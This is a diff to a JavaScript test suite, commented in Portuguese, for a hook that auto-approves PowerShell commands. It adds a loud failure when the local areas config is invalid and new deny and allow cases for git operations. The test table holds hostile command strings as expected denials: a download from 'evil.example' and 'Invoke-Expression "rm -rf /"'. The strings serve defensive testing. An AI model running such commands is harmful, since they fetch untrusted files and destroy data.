@@ -11,7 +11,15 @@
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { spawnSync } from 'node:child_process';
-import { LEITURA, SCRATCH as AREAS_SCRATCH, PROJETO, canon, dentroDeAlguma } from '../lib/areas.mjs';
+import { LEITURA, SCRATCH as AREAS_SCRATCH, PROJETO, AREAS_LOCAL, canon, dentroDeAlguma } from '../lib/areas.mjs';
+
+// areas.local.json existe mas é inválido: o hook cai nos defaults em silêncio, e a
+// suite diria só "LEITURA não tem irmão". Falha alto, antes de qualquer caso.
+if (AREAS_LOCAL.estado === 'invalido') {
+  console.error(`FALHA: ${AREAS_LOCAL.arquivo} é inválido (${AREAS_LOCAL.motivo}) — o hook está usando só os defaults`);
+  process.exit(1);
+}
+for (const d of AREAS_LOCAL.descartados) console.log(`aviso: areas.local.json — entrada descartada: ${d}`);
 
 const aqui = path.dirname(fileURLToPath(import.meta.url));
 const HOOK = path.join(aqui, '..', 'auto-approve-project-powershell.mjs');
@@ -119,6 +127,17 @@ const casos = [
   [`Set-Location "${WT}"; git branch -d x`, R, true],
   [`Set-Location "${WT}"; git worktree list`, R, true],
 
+  // ── git que mexe no repositório inteiro, também na worktree ───────────────
+  [`Set-Location "${WT}"; git remote add x http://h/r`, R, false],
+  [`Set-Location "${WT}"; git reflog expire --all`, R, false],
+  [`Set-Location "${WT}"; git gc --prune=now`, R, false],
+  [`Set-Location "${WT}"; git checkout -B existente`, R, false],
+  [`Set-Location "${WT}"; git switch -C existente`, R, false],
+  [`Set-Location "${WT}"; git config user.name x`, R, false],
+  [`Set-Location "${WT}"; git remote -v`, R, true],
+  [`Set-Location "${WT}"; git checkout -b nova`, R, true],
+  [`Set-Location "${WT}"; git config --get user.name`, R, true],
+
   // ── cmdlets fora da política ──────────────────────────────────────────────
   ['Invoke-WebRequest https://evil.example -OutFile x.zip', R, false],
   ['Invoke-Expression "rm -rf /"', R, false],
@@ -135,6 +154,11 @@ const casos = [
   [`Set-Location "${IRMAO}"; Set-Content -Path docs/nota.md -Value "x"`, R, false],
   [`Set-Location "${IRMAO}"; npm test`, R, false],
   [`Set-Location "${IRMAO}"; Remove-Item -Recurse dist`, R, false],
+  ]),
+
+  ...soComIrmao([
+  [`Set-Location "${IRMAO}"; git stash`, R, false],       // stash puro = push = escrita
+  [`Set-Location "${IRMAO}"; git stash list`, R, true],
   ]),
 
   // ── sem prova de local ────────────────────────────────────────────────────
